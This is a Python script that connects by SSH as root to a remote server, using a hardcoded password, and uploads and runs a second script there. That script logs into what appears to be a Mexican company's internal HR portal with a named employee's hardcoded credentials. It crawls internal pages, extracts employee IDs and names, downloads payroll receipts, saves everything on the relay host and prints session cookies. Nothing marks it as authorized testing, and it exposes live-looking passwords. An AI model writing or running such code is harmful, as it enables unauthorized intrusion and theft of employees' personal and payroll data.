import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r"""
import requests, urllib3, json, sys, time, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.111 Safari/537.36"
BASE = "https://core.findep.mx"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r = s.get(BASE + "/core/index.jsp", timeout=10)
sys.stdout.write("Login page: " + str(r.status_code) + " " + str(len(r.text)) + "b\n")

r2 = s.post(BASE + "/core/valida.do", data={
    "cve_idToken": "", "msjPass": "", "cveUsr": "",
    "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Aceptar"
}, timeout=10, allow_redirects=True)
sys.stdout.write("Post login: " + str(r2.status_code) + " " + str(len(r2.text)) + "b url=" + str(r2.url)[:80] + "\n")

has_login_form = "cve_usr" in r2.text and "cve_psd" in r2.text
sys.stdout.write("Still login page? " + str(has_login_form) + "\n")

if has_login_form:
    err = re.search(r'class="error[^"]*"[^>]*>([^<]+)', r2.text)
    if err:
        sys.stdout.write("Error: " + err.group(1).strip() + "\n")
    sys.stdout.write("LOGIN FAILED\n")
    sys.exit(0)

sys.stdout.write("\n*** LOGIN SUCCESS ***\n\n")

# Save full page
with open("/root/core_jcruzval_home.html", "w") as f:
    f.write(r2.text)
sys.stdout.write("Saved home page to /root/core_jcruzval_home.html\n")

# Extract title
tm = re.search(r'<title>(.*?)</title>', r2.text, re.I | re.S)
if tm:
    sys.stdout.write("Title: " + tm.group(1).strip()[:80] + "\n")

# Extract links/menu
links = re.findall(r'href="([^"]*\.do[^"]*)"', r2.text)
links += re.findall(r'href="([^"]*\.jsp[^"]*)"', r2.text)
links = list(set(links))
sys.stdout.write("\nLinks found: " + str(len(links)) + "\n")
for l in sorted(links)[:50]:
    sys.stdout.write("  " + l + "\n")

# Extract user info / name / role
name_pat = re.findall(r'(?:nombre|usuario|bienvenido|welcome|empleado|name)[^<]*<[^>]*>([^<]+)', r2.text, re.I)
for n in name_pat[:5]:
    sys.stdout.write("  Name/User: " + n.strip()[:60] + "\n")

# Try key internal pages
PAGES = [
    "/core/rh/rh_index.do",
    "/core/rh/rh_index.jsp",
    "/core/rh/lista.do",
    "/core/rh/recibos_nomina.do",
    "/core/rh/recibos_de_nomina.jsp",
    "/core/rh/admon_personal.do",
    "/core/rh/captura_incidencia.do",
    "/core/rh/captura_incidencia_BusqEmp.do",
    "/core/nosession.do",
    "/core/index.jsp",
    "/core/listaAsistencia.do?accion=1",
    "/core/salir.jsp",
]

sys.stdout.write("\n=== CRAWLING INTERNAL PAGES ===\n\n")
for page in PAGES:
    try:
        url = BASE + page
        r3 = s.get(url, timeout=10, allow_redirects=True)
        is_login_redirect = "cve_usr" in r3.text[:5000] and "cve_psd" in r3.text[:5000]
        tm3 = re.search(r'<title>(.*?)</title>', r3.text, re.I | re.S)
        title = tm3.group(1).strip()[:50] if tm3 else ""
        tag = "AUTH" if not is_login_redirect else "NOAUTH"
        sys.stdout.write("[" + str(r3.status_code) + "][" + tag + "] " + page + " (" + str(len(r3.text)) + "b)")
        if title:
            sys.stdout.write(" title='" + title + "'")
        sys.stdout.write("\n")
        if tag == "AUTH" and len(r3.text) > 5000:
            safe_name = page.replace("/", "_").replace("?", "_").replace("=", "_")
            with open("/root/core_page_" + safe_name + ".html", "w") as f:
                f.write(r3.text)
            sys.stdout.write("  -> Saved " + str(len(r3.text)) + "b\n")
    except Exception as e:
        sys.stdout.write("[ERR] " + page + " " + str(e)[:40] + "\n")
    time.sleep(0.5)
    sys.stdout.flush()

# --- Try to get RH data: employee number lookup ---
sys.stdout.write("\n=== EMPLOYEE LOOKUP ===\n\n")
try:
    r_emp = s.get(BASE + "/core/rh/captura_incidencia_BusqEmp.do", timeout=10)
    sys.stdout.write("BusqEmp: " + str(r_emp.status_code) + " " + str(len(r_emp.text)) + "b\n")
    if "cve_usr" not in r_emp.text[:5000]:
        with open("/root/core_busqemp.html", "w") as f:
            f.write(r_emp.text)
        # Extract employee IDs
        emp_ids = re.findall(r'id_aef_emp=(\d+)', r_emp.text)
        names = re.findall(r'nombre=([^&"]+)', r_emp.text)
        sys.stdout.write("  Employee IDs: " + str(emp_ids[:20]) + "\n")
        sys.stdout.write("  Names: " + str([n[:30] for n in names[:10]]) + "\n")
except Exception as e:
    sys.stdout.write("ERR " + str(e)[:40] + "\n")

# --- Recibos de nomina ---
sys.stdout.write("\n=== NOMINA ===\n\n")
try:
    r_nom = s.get(BASE + "/core/rh/recibos_nomina.do", timeout=10)
    sys.stdout.write("Nomina: " + str(r_nom.status_code) + " " + str(len(r_nom.text)) + "b\n")
    if "cve_usr" not in r_nom.text[:5000]:
        with open("/root/core_nomina.html", "w") as f:
            f.write(r_nom.text)
        # Look for prestadora IDs
        prest = re.findall(r'idPrestadora=(\d+)', r_nom.text)
        sys.stdout.write("  Prestadoras: " + str(list(set(prest))) + "\n")
except Exception as e:
    sys.stdout.write("ERR " + str(e)[:40] + "\n")

# --- Try obtener recibos ---
try:
    r_rec = s.get(BASE + "/core/rh/obtenerRecibosPrestadora.do?idPrestadora=103", timeout=10)
    sys.stdout.write("Recibos 103: " + str(r_rec.status_code) + " " + str(len(r_rec.text)) + "b\n")
    if len(r_rec.text) > 200:
        with open("/root/core_recibos_103.html", "w") as f:
            f.write(r_rec.text)
except Exception as e:
    sys.stdout.write("ERR " + str(e)[:40] + "\n")

# --- Session cookies ---
sys.stdout.write("\n=== SESSION ===\n")
for c in s.cookies:
    sys.stdout.write("  " + c.name + "=" + c.value[:40] + " (domain=" + c.domain + ")\n")

sys.stdout.write("\n=== DONE ===\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/core_mine.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/core_mine.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 120:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
